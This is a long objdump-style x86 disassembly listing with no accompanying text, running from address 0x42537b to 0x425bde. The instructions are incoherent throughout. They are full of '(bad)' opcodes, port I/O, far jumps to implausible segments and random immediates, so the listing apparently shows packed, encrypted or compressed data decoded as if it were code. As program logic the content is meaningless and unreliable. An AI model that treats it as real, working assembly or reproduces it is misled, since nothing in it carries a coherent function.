  42537b:	xor    al,0x81
  42537d:	aam    0xc4
  42537f:	sti    
  425380:	out    0xba,eax
  425382:	xor    ebp,eax
  425384:	add    al,0xc9
  425386:	xchg   esi,eax
  425387:	xchg   ecx,eax
  425388:	(bad)  
  425389:	jg     0x425401
  42538b:	dec    eax
  42538c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42538d:	push   ds
  42538e:	fs mov ebp,0xbb749268
  425394:	xor    al,0xcd
  425396:	fwait
  425397:	push   esp
  425398:	fucomip st,st(4)
  42539a:	hlt    
  42539b:	xor    al,0xdd
  42539d:	mov    bl,0xfe
  42539f:	aaa    
  4253a0:	mul    BYTE PTR [esi+0x5b0b6a4c]
  4253a6:	mov    eax,0x4a9f9bc3
  4253ab:	add    al,0x70
  4253ad:	cmp    al,0xce
  4253af:	scas   al,BYTE PTR es:[edi]
  4253b0:	out    0x89,al
  4253b2:	mov    edi,0x31efa900
  4253b7:	sbb    esp,DWORD PTR [edx+0x5e692922]
  4253bd:	push   eax
  4253be:	push   ebx
  4253bf:	push   esp
  4253c0:	push   ax
  4253c2:	ja     0x425367
  4253c4:	pop    ebx
  4253c5:	fmul   DWORD PTR [esi-0x2f26ad55]
  4253cb:	je     0x4253ba
  4253cd:	mov    ch,0x9f
  4253cf:	xchg   ebx,eax
  4253d0:	sub    BYTE PTR [edx-0x52],dl
  4253d3:	mov    bl,bl
  4253d5:	dec    esi
  4253d6:	adc    eax,0xfb8e4e3a
  4253db:	push   esi
  4253dc:	mov    eax,ds:0x9f89a6bf
  4253e1:	mov    bl,0xf7
  4253e3:	or     edx,DWORD PTR [esi-0x52]
  4253e6:	jae    0x42540f
  4253e8:	adc    al,0x4d
  4253ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4253eb:	or     esi,ebx
  4253ed:	pop    ebx
  4253ee:	jns    0x42544a
  4253f0:	cmp    ah,dl
  4253f2:	xchg   esp,eax
  4253f3:	and    ecx,DWORD PTR [ebx]
  4253f5:	mov    eax,0x58931e69
  4253fa:	xor    ecx,DWORD PTR [ecx]
  4253fc:	pop    ecx
  4253fd:	xchg   ebx,eax
  4253fe:	cmp    eax,0x752dc00a
  425403:	pop    ebx
  425404:	call   0x36ed:0xe433969c
  42540b:	aam    0xab
  42540d:	rol    BYTE PTR [edx-0x6a4bf31d],0x32
  425414:	jbe    0x425409
  425416:	mov    bh,0x37
  425418:	iret   
  425419:	ficomp WORD PTR [edi-0x58]
  42541c:	push   ecx
  42541d:	cli    
  42541e:	test   DWORD PTR [ecx-0x15],ebx
  425421:	adc    al,0x64
  425423:	jmp    0x6fe3:0xe4edceaa
  42542a:	aam    0x8
  42542c:	pop    eax
  42542d:	or     eax,0xa1e8ceef
  425432:	outs   dx,DWORD PTR ds:[esi]
  425433:	je     0x425419
  425435:	int    0xbd
  425437:	shr    eax,cl
  425439:	xchg   edx,eax
  42543a:	mov    edx,0x7711f641
  42543f:	popa   
  425440:	mov    edx,eax
  425442:	addr16 int3 
  425444:	mov    eax,0xa829ee3f
  425449:	xchg   ebp,eax
  42544a:	sbb    eax,0xf04d356d
  42544f:	shl    BYTE PTR [eax+ebp*8+0x1e74f3d0],0x86
  425457:	scas   eax,DWORD PTR es:[edi]
  425458:	leave  
  425459:	xchg   edx,eax
  42545a:	pop    eax
  42545b:	inc    ebp
  42545c:	xor    bh,BYTE PTR [ecx]
  42545e:	lds    esp,FWORD PTR es:[bx]
  425462:	call   0x75bf:0x2fce05d7
  425469:	sar    DWORD PTR [esi+ebx*4-0x1e],0x5f
  42546e:	mov    BYTE PTR [edx],ch
  425470:	stc    
  425471:	push   cs
  425472:	loop   0x425406
  425474:	loope  0x42544f
  425476:	(bad)  
  425477:	mov    al,ah
  425479:	adc    ecx,DWORD PTR [edx+eiz*8-0x1a]
  42547d:	mov    BYTE PTR [edx+edi*4+0x7fbc135f],bl
  425484:	jl     0x425475
  425486:	jg     0x425451
  425488:	data16 mov ch,0xd8
  42548b:	fld    TBYTE PTR [edx]
  42548d:	or     ecx,DWORD PTR [edi+0x37]
  425490:	dec    ecx
  425491:	or     ah,BYTE PTR [edi]
  425493:	mov    al,ds:0xd65a4
	...
  425514:	xor    eax,esp
  425516:	loope  0x4254d1
  425518:	icebp  
  425519:	mov    ecx,0xab3fe879
  42551e:	in     al,0x3
  425520:	sub    eax,0xe52caeae
  425525:	out    0x1,eax
  425527:	add    BYTE PTR [ebx+0x7],ch
  42552a:	add    BYTE PTR [eax],al
  42552c:	fucomip st,st(3)
  42552e:	bound  edi,QWORD PTR [edi+eiz*4+0x17]
  425532:	je     0x42550c
  425534:	cld    
  425535:	add    al,0x68
  425537:	dec    edx
  425538:	inc    ebp
  425539:	scas   al,BYTE PTR es:[edi]
  42553a:	mov    esp,DWORD PTR [ebx+0x641a27ea]
  425540:	sqrtps xmm3,XMMWORD PTR [esi+0x48d42395]
  425547:	aas    
  425548:	mov    ch,0xfa
  42554a:	fiadd  WORD PTR [ebx+0x31]
  42554d:	mov    ds:0x55b0d8a0,al
  425552:	icebp  
  425553:	mov    ecx,0x683477b0
  425558:	outs   dx,DWORD PTR ds:[esi]
  425559:	push   es
  42555a:	loope  0x425563
  42555c:	mov    ch,0x27
  42555e:	jnp    0x425520
  425560:	in     eax,dx
  425561:	(bad)  
  425562:	xchg   ebp,eax
  425563:	sub    dh,BYTE PTR [esi+edx*8]
  425566:	rcr    al,0x59
  425569:	imul   ebx,DWORD PTR [edi+0x5a2cde72],0x52df32fb
  425573:	sbb    al,0xe1
  425575:	xchg   edx,eax
  425576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425577:	jl     0x4255af
  425579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42557a:	and    ecx,DWORD PTR [ebp-0x6d]
  42557d:	mov    edx,0xa9597541
  425582:	loope  0x425561
  425584:	push   esi
  425585:	stos   BYTE PTR es:[edi],al
  425586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425587:	out    dx,al
  425588:	and    dh,BYTE PTR [ecx]
  42558a:	and    DWORD PTR [eax],ebp
  42558c:	dec    ebp
  42558d:	adc    edi,esi
  42558f:	mov    edi,0x13018432
  425594:	sbb    DWORD PTR [ecx+0x4a],edi
  425597:	add    al,0x93
  425599:	cmp    eax,0x4da726de
  42559e:	mov    cl,0x6e
  4255a0:	ds pop ss
  4255a2:	pop    esp
  4255a3:	iret   
  4255a4:	inc    ebp
  4255a5:	push   eax
  4255a6:	lods   al,BYTE PTR ds:[esi]
  4255a7:	test   ebp,ebx
  4255a9:	or     BYTE PTR [ebp-0x12],bh
  4255ac:	jns    0x4255bc
  4255ae:	nop
  4255af:	jno    0x425539
  4255b1:	ret    0xff65
  4255b4:	jb     0x4255c4
  4255b6:	cdq    
  4255b7:	mov    ds:0xe2df4af6,al
  4255bc:	rol    BYTE PTR [ebx],0xe9
  4255bf:	retf   0xa73a
  4255c2:	scas   eax,DWORD PTR es:[edi]
  4255c3:	aad    0x7a
  4255c5:	xchg   BYTE PTR [edx-0xeb70a89],dl
  4255cb:	(bad)  
  4255cc:	pop    esp
  4255cd:	inc    edx
  4255ce:	xor    al,0xdd
  4255d0:	outs   dx,DWORD PTR ds:[esi]
  4255d1:	test   DWORD PTR [ebp+0x4c31ae94],0xf3bad56c
  4255db:	ror    DWORD PTR [edx-0xc4c993c],cl
  4255e1:	and    eax,esp
  4255e3:	in     eax,0x77
  4255e5:	test   al,0xc9
  4255e7:	out    0xbd,al
  4255e9:	sub    al,0x38
  4255eb:	scas   al,BYTE PTR es:[edi]
  4255ec:	mov    eax,ds:0x8b60a47b
  4255f1:	push   ss
  4255f2:	xchg   esp,eax
  4255f3:	mov    ah,0x28
  4255f5:	aad    0x63
  4255f7:	ds inc ebp
  4255f9:	jno    0x425607
  4255fb:	or     edi,ebx
  4255fd:	in     al,0x27
  4255ff:	fcomp  DWORD PTR [eax+0x700c2126]
  425605:	mov    esi,0x6b16ce03
  42560a:	rol    ecx,0xab
  42560d:	fiadd  WORD PTR [ecx]
  42560f:	out    0x70,eax
  425611:	dec    ecx
  425612:	cmp    dl,BYTE PTR [edx+0x471587d0]
  425618:	xlat   BYTE PTR ds:[ebx]
  425619:	jae    0x425656
  42561b:	mov    bh,ch
  42561d:	dec    ecx
  42561e:	sbb    al,0xcf
  425620:	xchg   DWORD PTR ds:[esi+0x79c9a63f],ebx
  425627:	loopne 0x4256a8
  425629:	dec    ebx
  42562a:	sub    bh,BYTE PTR [ebx]
  42562c:	int    0xb3
  42562e:	sbb    edx,DWORD PTR [esp+edx*4-0x151f03fe]
  425635:	dec    ecx
  425636:	inc    DWORD PTR [eax]
  425638:	loope  0x42566e
  42563a:	test   DWORD PTR [ecx-0xc],esp
  42563d:	jmp    0x663b1b5e
  425642:	(bad)  
  425643:	hlt    
  425644:	out    dx,eax
  425645:	mov    eax,ds:0x5e538f50
  42564a:	adc    DWORD PTR [ecx],ebp
  42564c:	inc    ecx
  42564d:	xor    eax,DWORD PTR [edi+0x67b9e4b3]
  425653:	jp     0x425647
  425655:	xor    dl,BYTE PTR [esi+0x25]
  425658:	dec    esp
  425659:	pop    ds
  42565a:	or     esi,edi
  42565c:	xor    esi,DWORD PTR [esi+0x7382ea43]
  425662:	jecxz  0x4256cd
  425664:	dec    ebp
  425665:	or     dh,BYTE PTR [esi]
  425667:	ret    0x5dce
  42566a:	ret    
  42566b:	into   
  42566c:	jbe    0x4256b1
  42566e:	test   DWORD PTR [ecx+0x5f],ebx
  425671:	nop
  425672:	fsubrp st(2),st
  425674:	int3   
  425675:	jae    0x425685
  425677:	xchg   edi,eax
  425678:	fldenv [ecx]
  42567a:	mov    al,ds:0x74f10e8a
  42567f:	push   ss
  425680:	push   0xede2216c
  425685:	jo     0x4256df
  425687:	jge    0x42567e
  425689:	movsx  eax,WORD PTR [esi+0x7881b4c7]
  425690:	outs   dx,BYTE PTR ds:[esi]
  425691:	xchg   esi,eax
  425692:	in     al,0x58
  425694:	fsubr  QWORD PTR [esi+0x59]
  425697:	mov    ah,0x6b
  425699:	jg     0x425713
  42569b:	shr    BYTE PTR [esi+0x4d],1
  42569e:	pop    ss
  42569f:	ret    0x8829
  4256a2:	das    
  4256a3:	fisttp WORD PTR [edx+0x69]
  4256a6:	cmp    bl,ah
  4256a8:	cmp    ch,dl
  4256aa:	and    DWORD PTR [ebp+0x69],edx
  4256ad:	mov    ah,0x9d
  4256af:	aaa    
  4256b0:	and    al,0x3f
  4256b2:	sub    eax,esp
  4256b4:	enter  0x47ac,0x32
  4256b8:	sub    BYTE PTR [ebp-0x5074fc10],al
  4256be:	and    BYTE PTR [ebx+0x65919bc9],0x5a
  4256c5:	or     eax,0x3ea7de18
  4256ca:	clc    
  4256cb:	arpl   cx,si
  4256cd:	mov    bl,0x20
  4256cf:	jbe    0x425730
  4256d1:	push   ebx
  4256d2:	push   esi
  4256d3:	mov    es,WORD PTR [ebx+ecx*2]
  4256d6:	stos   DWORD PTR es:[edi],eax
  4256d7:	add    DWORD PTR [edi+0xa],eax
  4256da:	xchg   dx,ax
  4256dc:	repz xchg ch,dl
  4256df:	mov    ds:0x953f0fbe,eax
  4256e4:	fld1   
  4256e6:	dec    edi
  4256e7:	in     al,0x59
  4256e9:	out    dx,al
  4256ea:	push   es
  4256eb:	jecxz  0x42572c
  4256ed:	adc    bh,ch
  4256ef:	leave  
  4256f0:	mov    eax,ds:0x8940ff7b
  4256f5:	nop
  4256f6:	stc    
  4256f7:	fs inc edx
  4256f9:	pop    esi
  4256fa:	sbb    DWORD PTR [eax+0x7b90e8b9],0xffffff97
  425701:	jg     0x42571d
  425703:	fsub   st,st(6)
  425705:	jnp    0x425772
  425707:	cld    
  425708:	cli    
  425709:	xlat   BYTE PTR ds:[ebx]
  42570a:	and    bh,BYTE PTR [ebx]
  42570c:	or     dh,BYTE PTR [edx-0x5efb5344]
  425712:	loop   0x425751
  425714:	ds out dx,al
  425716:	or     edi,DWORD PTR gs:[eax+0x6128916a]
  42571d:	and    esp,DWORD PTR [edx]
  42571f:	fs in  al,0xd0
  425722:	mov    eax,0xf011de19
  425727:	out    0x72,al
  425729:	mov    al,0xc2
  42572b:	dec    ecx
  42572c:	repnz (bad)
  42572f:	lock push eax
  425731:	xor    BYTE PTR [esi+0x8fcdb81],ah
  425737:	push   0xfffffff3
  425739:	mov    ebp,0x48d3df2b
  42573e:	dec    eax
  42573f:	ins    DWORD PTR es:[edi],dx
  425740:	jmp    0x43f0:0xba06e612
  425747:	xchg   edi,eax
  425748:	jne    0x4256f8
  42574a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42574b:	idiv   BYTE PTR [edi]
  42574d:	pop    ebp
  42574e:	call   0xbe54:0x9627e8f9
  425755:	pushf  
  425756:	push   esp
  425757:	xor    BYTE PTR [esi],0x49
  42575a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42575b:	(bad)  [ebp-0x23a8f0ae]
  425761:	(bad)  
  425763:	daa    
  425764:	jge    0x4257b8
  425766:	mov    al,ch
  425768:	mov    bl,0xa5
  42576a:	xor    al,0xd
  42576c:	jge    0x4257ba
  42576e:	push   cs
  42576f:	mov    ah,bl
  425771:	fadd   st(0),st
  425773:	push   ecx
  425774:	bound  eax,QWORD PTR [edx+0x4c8d32af]
  42577a:	cdq    
  42577b:	ja     0x4257ba
  42577d:	jb     0x425742
  42577f:	add    eax,0xf3d62ff0
  425784:	add    eax,0xe93ed7e7
  425789:	test   BYTE PTR [ebx],bl
  42578b:	lahf   
  42578c:	out    dx,al
  42578d:	sar    DWORD PTR [edx-0x34f7ae95],0x4
  425794:	clc    
  425795:	cld    
  425796:	mov    ebx,0xa92eef72
  42579b:	scas   al,BYTE PTR es:[edi]
  42579c:	jae    0x4257ba
  42579e:	inc    ebx
  4257a0:	pop    eax
  4257a1:	aaa    
  4257a2:	dec    eax
  4257a3:	ret    0xa267
  4257a6:	popa   
  4257a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257a8:	imul   esp,DWORD PTR [edx],0xffffffde
  4257ab:	popf   
  4257ac:	or     al,0x29
  4257ae:	pop    ds
  4257af:	fstp   DWORD PTR [esi+0x1ad33947]
  4257b5:	adc    bh,BYTE PTR [ebx-0x6f]
  4257b8:	adc    BYTE PTR [esi-0x6e],bh
  4257bb:	test   eax,0x71dddfdb
  4257c0:	rcl    bh,0xe2
  4257c3:	(bad)  
  4257c4:	cmp    eax,0x9bdb3677
  4257c9:	retf   0xcea8
  4257cc:	mov    DWORD PTR [ecx+0x2c],0x52865922
  4257d3:	jno    0x4257c9
  4257d5:	sbb    edi,DWORD PTR [edx+0x423b4580]
  4257db:	rcr    BYTE PTR [ebx-0x6a],1
  4257de:	lock and al,0x58
  4257e1:	add    cl,BYTE PTR [esi]
  4257e3:	popf   
  4257e4:	pusha  
  4257e5:	push   0xa3c285d8
  4257ea:	jmp    0x718f:0x5036ccf
  4257f1:	call   0x3747b63a
  4257f6:	cmp    esi,DWORD PTR [eax-0x5c]
  4257f9:	cmp    eax,DWORD PTR [edx]
  4257fb:	ret    0x159e
  4257fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257ff:	xor    eax,0x7fdebc51
  425804:	push   cs
  425805:	push   eax
  425806:	and    bp,WORD PTR [eax]
  425809:	mov    dl,0xfb
  42580b:	or     ecx,DWORD PTR [ebx-0x7832202b]
  425811:	adc    ecx,DWORD PTR [edi-0xd]
  425814:	fs enter 0x3129,0x88
  425819:	dec    ebp
  42581a:	add    edi,edx
  42581c:	dec    ebx
  42581d:	adc    ebp,ecx
  42581f:	mov    ebp,0xa7377dec
  425824:	(bad)  
  425827:	test   ch,0xb7
  42582a:	mov    edx,0x8506da65
  42582f:	push   ds
  425830:	jno    0x425842
  425832:	pop    ebx
  425833:	push   cs
  425834:	or     al,0xb9
  425836:	popa   
  425837:	jnp    0x4257f5
  425839:	and    ch,bh
  42583b:	(bad)  
  42583c:	mov    al,ds:0x83bdd83a
  425841:	mov    ds:0x6456b9f8,eax
  425846:	mov    dh,0xc8
  425848:	pushf  
  425849:	xchg   esi,eax
  42584a:	rol    DWORD PTR [eax],cl
  42584c:	rcl    DWORD PTR [ecx-0x1d8671fd],1
  425852:	mov    ds:0x991af1f1,al
  425857:	sub    BYTE PTR [ecx],cl
  425859:	and    eax,0x61a02e9
  42585e:	jo     0x425820
  425860:	nop
  425861:	rcr    BYTE PTR [ebp+0x21],1
  425864:	or     ch,BYTE PTR [ebp-0x3a]
  425867:	xchg   ecx,eax
  425868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425869:	call   esp
  42586b:	or     dh,BYTE PTR [edi+0x32]
  42586e:	fsubrp st(6),st
  425870:	xor    bh,BYTE PTR [edx-0x24]
  425873:	mov    eax,ds:0xacfea061
  425878:	fst    QWORD PTR [ecx+0x63376d64]
  42587e:	stos   BYTE PTR es:[edi],al
  42587f:	cmp    al,0x8
  425881:	stos   BYTE PTR es:[edi],al
  425882:	xchg   esi,eax
  425883:	push   edx
  425884:	pop    esi
  425885:	test   al,ch
  425887:	(bad)  
  425889:	add    DWORD PTR [edx],0x23
  42588c:	test   al,0x99
  42588e:	(bad)  
  42588f:	mov    ebp,0xb33198e4
  425894:	(bad)  
  425895:	sbb    eax,0x62129284
  42589a:	stos   BYTE PTR es:[edi],al
  42589b:	shl    DWORD PTR [ecx-0x30],cl
  42589e:	jae    0x425863
  4258a0:	jge    0x42588a
  4258a2:	cld    
  4258a3:	mov    ds:0x793262ac,eax
  4258a8:	sub    al,BYTE PTR [esi]
  4258aa:	mov    ch,0x17
  4258ac:	mov    ebx,0x93e69359
  4258b1:	inc    esp
  4258b2:	or     BYTE PTR [edi-0x76],0x9
  4258b6:	cld    
  4258b7:	shl    BYTE PTR [ecx-0x367732b6],1
  4258bd:	(bad)  [esi+0x4d47206]
  4258c3:	add    eax,0x18c6c5fe
  4258c8:	arpl   WORD PTR [ebx],bp
  4258ca:	outs   dx,DWORD PTR ds:[esi]
  4258cb:	int3   
  4258cc:	retf   0x1e25
  4258cf:	lods   al,BYTE PTR ds:[esi]
  4258d0:	xlat   BYTE PTR ds:[ebx]
  4258d1:	dec    ecx
  4258d2:	jmp    0x80071b27
  4258d7:	jmp    0x4d12d32f
  4258dc:	jae    0x4258b1
  4258de:	imul   edi,DWORD PTR [ecx],0x32
  4258e1:	adc    DWORD PTR [ebx+eiz*1-0x3812e733],0x72
  4258e9:	mov    BYTE PTR [ecx],ah
  4258eb:	inc    edx
  4258ec:	mov    ecx,0xa0bcf5d7
  4258f1:	or     al,0x20
  4258f3:	push   edi
  4258f4:	jl     0x425881
  4258f6:	fistp  DWORD PTR [esi]
  4258f8:	outs   dx,BYTE PTR ds:[esi]
  4258f9:	mov    ecx,0x63666a16
  4258fe:	int3   
  4258ff:	ins    BYTE PTR es:[edi],dx
  425900:	pop    edi
  425901:	mov    esp,0x1a22d2c6
  425906:	fstp   TBYTE PTR ds:0x12ea4441
  42590c:	sub    eax,0x30071a3f
  425911:	mov    cs,WORD PTR [edx-0x4c044f62]
  425917:	pop    eax
  425918:	jns    0x425938
  42591a:	jp     0x4258a9
  42591c:	lds    edx,FWORD PTR [ebp-0x62]
  42591f:	test   BYTE PTR [edx-0x5],dh
  425922:	mov    ch,0x7c
  425924:	jl     0x4258d1
  425926:	xor    eax,0x9ca1757b
  42592b:	pop    edi
  42592c:	sti    
  42592d:	jnp    0x425920
  42592f:	(bad)  
  425930:	imul   esp,edi,0x12
  425933:	xchg   DWORD PTR [edx-0x50],edi
  425936:	mov    ah,0x1d
  425938:	adc    eax,0xc352e53d
  42593d:	sub    esi,DWORD PTR [bp-0x1905]
  425942:	shl    BYTE PTR [ebp-0x473491d2],cl
  425948:	in     eax,0xc2
  42594a:	adc    DWORD PTR [ecx+eax*8+0x6768ef3e],esi
  425951:	fisttp QWORD PTR [ecx-0x74]
  425954:	jne    0x4258f2
  425956:	inc    eax
  425957:	daa    
  425958:	out    0xfc,eax
  42595a:	inc    edx
  42595b:	xor    DWORD PTR [edi-0x1da7e63b],edx
  425961:	sub    dl,al
  425963:	mov    esp,0xf48bca11
  425968:	rcr    BYTE PTR [edx],cl
  42596a:	jne    0x425939
  42596c:	in     al,dx
  42596d:	cs mov eax,0x1e10e875
  425973:	cmp    DWORD PTR [ecx-0x5debd5a7],eax
  425979:	push   0x39
  42597b:	jp     0x4259a8
  42597d:	stc    
  42597e:	sar    DWORD PTR [ebx-0x16336fd1],cl
  425984:	xlat   BYTE PTR ds:[ebx]
  425985:	mov    bl,al
  425987:	dec    edi
  425988:	scas   al,BYTE PTR es:[edi]
  425989:	push   0xffffffd1
  42598b:	(bad)  
  42598c:	jb     0x425959
  42598e:	cmc    
  42598f:	inc    ecx
  425990:	aaa    
  425991:	icebp  
  425992:	dec    eax
  425993:	sahf   
  425994:	loope  0x425a01
  425996:	sbb    bh,BYTE PTR [edx+0x274f8679]
  42599c:	retf   0x2d17
  42599f:	cs cmp al,0x96
  4259a2:	add    DWORD PTR [ecx+0xfd333e],esi
  4259a8:	push   ds
  4259a9:	test   edi,eax
  4259ab:	pusha  
  4259ac:	js     0x425a24
  4259ae:	ins    BYTE PTR es:[edi],dx
  4259af:	and    DWORD PTR [ebx+0x48],0x5e
  4259b3:	ins    DWORD PTR es:[edi],dx
  4259b4:	mov    eax,0xc9c10773
  4259b9:	into   
  4259ba:	test   bh,al
  4259bc:	mov    bl,0x9
  4259be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259bf:	mov    eax,ds:0x10fe8277
  4259c4:	pop    esi
  4259c5:	mov    edx,0xfc8e554b
  4259ca:	mov    al,0xb0
  4259cc:	mov    ebx,0xa7db0a62
  4259d1:	cmp    eax,ebp
  4259d3:	outs   dx,DWORD PTR ds:[esi]
  4259d4:	adc    ecx,DWORD PTR [eax-0x4b]
  4259d7:	sub    ebp,ebx
  4259d9:	mov    bh,0xc1
  4259db:	in     eax,dx
  4259dc:	scas   al,BYTE PTR es:[edi]
  4259dd:	xlat   BYTE PTR ds:[ebx]
  4259de:	lods   eax,DWORD PTR ds:[esi]
  4259df:	mov    al,0x78
  4259e1:	mov    edx,0xf4d101a9
  4259e6:	pop    ebp
  4259e7:	push   ds
  4259e8:	xchg   DWORD PTR [eax-0x6904a616],edi
  4259ee:	jnp    0x425a30
  4259f0:	and    eax,0xcafb9ddf
  4259f5:	(bad)  
  4259f6:	and    DWORD PTR [esi],edx
  4259f8:	push   esi
  4259f9:	les    ebx,FWORD PTR [eax+0x5e]
  4259fc:	push   0xdd33a875
  425a01:	inc    eax
  425a02:	fimul  DWORD PTR [esi+0x3a]
  425a05:	push   ss
  425a06:	mov    edx,0x5001512b
  425a0b:	imul   ebp,DWORD PTR [edi+eax*2+0x5e4b57d6],0xfffffff9
  425a13:	dec    esp
  425a14:	and    dl,BYTE PTR [eax+ebp*8-0x20]
  425a18:	mov    bl,0x5a
  425a1a:	in     eax,0xfc
  425a1c:	pop    ebp
  425a1d:	push   ss
  425a1e:	xchg   BYTE PTR [ecx],al
  425a20:	rcl    ch,1
  425a22:	fst    DWORD PTR [ecx-0x216e1a45]
  425a28:	lods   eax,DWORD PTR ds:[esi]
  425a29:	add    al,dl
  425a2b:	push   es
  425a2c:	cmp    eax,0x513b10d2
  425a31:	test   BYTE PTR [edx-0x13],dl
  425a34:	loopne 0x425a0d
  425a36:	out    dx,eax
  425a37:	ins    DWORD PTR es:[edi],dx
  425a38:	dec    esp
  425a39:	mul    DWORD PTR [ebp+0xfb7faf4]
  425a3f:	(bad)
  425a42:	cmp    esi,edx
  425a44:	mov    esi,0xebdfef8e
  425a49:	xchg   BYTE PTR [ebp+eiz*1+0x716c0bf],ch
  425a50:	cli    
  425a51:	xor    DWORD PTR [esi+0x2e99a668],eax
  425a57:	adc    eax,0x8b3a04ea
  425a5c:	jg     0x425a48
  425a5e:	lahf   
  425a5f:	test   DWORD PTR [ebp*1-0x58532c02],0xb51b0724
  425a6a:	jge    0x425a12
  425a6c:	dec    ebx
  425a6d:	inc    esp
  425a6e:	hlt    
  425a6f:	inc    esi
  425a70:	(bad)  
  425a71:	jmp    0x425ace
  425a73:	pop    ecx
  425a74:	adc    al,0xbe
  425a76:	ss (bad) 
  425a78:	mov    esi,DWORD PTR [ecx]
  425a7a:	fsub   DWORD PTR [eax-0xc271d13]
  425a80:	and    eax,0x70e1e5af
  425a85:	pop    ds
  425a86:	pushf  
  425a87:	mov    edi,0xe607a1ec
  425a8c:	dec    esp
  425a8d:	cmp    edx,DWORD PTR [edx+0x36903449]
  425a93:	or     edx,ebp
  425a95:	out    0xc,al
  425a97:	lock arpl WORD PTR [edx+0x22],bp
  425a9b:	sbb    ebx,0x9acb80f1
  425aa1:	in     eax,0x4c
  425aa3:	adc    BYTE PTR [edx],0x30
  425aa6:	xor    esp,DWORD PTR [ebx]
  425aa8:	retf   0x5235
  425aab:	mov    dl,0x73
  425aad:	and    ebp,esi
  425aaf:	adc    eax,0x2d8819a
  425ab4:	mov    es,WORD PTR [edx-0x3f]
  425ab7:	and    eax,DWORD PTR [esi-0x7]
  425aba:	jne    0x425ab8
  425abc:	push   es
  425abd:	fimul  WORD PTR ds:0xd3aaa96e
  425ac3:	ss out 0xf2,eax
  425ac6:	dec    esi
  425ac7:	fcom   QWORD PTR [ecx]
  425ac9:	in     eax,0xe0
  425acb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425acc:	jae    0x425ad2
  425ace:	adc    edx,ecx
  425ad0:	ret    
  425ad1:	ja     0x425ab4
  425ad3:	mov    eax,0xe73e8281
  425ad8:	inc    esp
  425ad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ada:	cmp    bl,BYTE PTR [edi+0x12]
  425add:	aas    
  425ade:	out    0x76,eax
  425ae0:	jmp    0x425b29
  425ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ae3:	dec    esi
  425ae4:	dec    eax
  425ae5:	inc    edx
  425ae6:	pop    ss
  425ae7:	mov    ch,0x20
  425ae9:	and    ebx,edx
  425aeb:	repz or eax,eax
  425aee:	mov    ch,0xcb
  425af0:	pxor   mm5,QWORD PTR [ebx+0x43]
  425af4:	sub    DWORD PTR [eax+eiz*4+0x47dd52a8],eax
  425afb:	add    DWORD PTR [edi-0xb],ebp
  425afe:	or     dh,bl
  425b00:	mov    ch,0x49
  425b02:	jmp    0x2ac4:0xfb731ac0
  425b09:	sbb    edi,eax
  425b0b:	test   BYTE PTR [esi-0xe10c2c0],ch
  425b11:	push   ecx
  425b12:	sub    ecx,ebp
  425b14:	push   edx
  425b15:	add    ecx,DWORD PTR [eax-0x67]
  425b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b19:	mov    ds:0xfd97374c,al
  425b1e:	fidivr DWORD PTR [ebx+0x25]
  425b21:	and    edi,ebx
  425b23:	dec    edi
  425b24:	popf   
  425b25:	(bad)  
  425b26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b27:	sbb    ch,cl
  425b29:	mov    ah,0x2e
  425b2b:	or     BYTE PTR [ebx-0x4a6c99ee],0x31
  425b32:	mov    bh,0xb9
  425b34:	mov    edx,eax
  425b36:	mov    esi,0xe0c31830
  425b3b:	jmp    0xcbe9437c
  425b40:	sar    BYTE PTR [edi],1
  425b42:	stc    
  425b43:	mov    ecx,0x971a925
  425b48:	adc    DWORD PTR [ebp-0x55],ebp
  425b4b:	push   ebx
  425b4c:	add    BYTE PTR [edx],cl
  425b4e:	jns    0x425b54
  425b50:	ror    DWORD PTR [edi+0x70],1
  425b53:	loopne 0x425ba0
  425b55:	sbb    DWORD PTR [esi+0x24],ebx
  425b58:	loope  0x425bd4
  425b5a:	lock arpl ax,di
  425b5d:	pop    eax
  425b5e:	retf   
  425b5f:	mov    ebp,0xb9655fe
  425b64:	int3   
  425b65:	push   0x2b7793ca
  425b6a:	sbb    eax,0x5dc57b3
  425b6f:	mov    ds:0xb8ab8a0c,al
  425b74:	mov    ah,0x47
  425b76:	push   eax
  425b77:	mov    bl,0x4
  425b79:	push   eax
  425b7a:	aas    
  425b7b:	fst    DWORD PTR [eax+0xa49a9f0]
  425b81:	aad    0x88
  425b83:	retf   0xb1fa
  425b86:	icebp  
  425b87:	and    DWORD PTR [edx],ebx
  425b89:	pop    ebp
  425b8a:	mov    ebx,0x7e73f243
  425b8f:	dec    ebp
  425b90:	jg     0x425b9c
  425b92:	push   ds
  425b93:	sbb    bl,dl
  425b95:	loop   0x425bad
  425b97:	xor    al,0xdb
  425b99:	loopne 0x425c10
  425b9b:	jbe    0x425be9
  425b9d:	in     al,0x50
  425b9f:	sbb    eax,0xffa228c1
  425ba4:	cmp    ebp,DWORD PTR [ecx+0x2]
  425ba7:	xor    eax,0xc30f513a
  425bac:	repnz pop edi
  425bae:	pop    edx
  425baf:	xchg   DWORD PTR ds:0x6c5fe6fe,ecx
  425bb5:	adc    eax,0x1c3ecb95
  425bba:	icebp  
  425bbb:	mov    ah,0xfc
  425bbd:	cdq    
  425bbe:	(bad)  
  425bc0:	ss add bl,al
  425bc3:	scas   al,BYTE PTR es:[edi]
  425bc4:	fst    DWORD PTR [edx-0x11]
  425bc7:	push   esi
  425bc8:	(bad)  
  425bc9:	(bad)
  425bcd:	or     DWORD PTR [edi],0x4f
  425bd0:	mov    dh,0xd6
  425bd2:	retf   
  425bd3:	xor    BYTE PTR [ecx+0x13],0x46
  425bd7:	cmp    al,0x54
  425bd9:	xor    al,0xf8
  425bdb:	aam    0xd0
  425bdd:	dec    ebx
  425bde:	fdivr  DWORD PTR [ecx+0x407bc764]
